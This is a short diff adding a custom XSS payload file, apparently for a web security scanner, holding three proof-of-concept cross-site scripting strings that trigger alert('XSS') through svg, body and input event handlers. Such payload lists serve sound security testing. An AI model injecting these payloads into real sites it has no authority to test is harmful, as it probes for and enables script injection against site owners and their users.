@@ -1,0 +1,7 @@
+# Custom XSS Payloads
+# Add your custom payloads here (one per line)
+# Lines starting with # are ignored
+
+<svg/onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+<input autofocus onfocus=alert('XSS')>
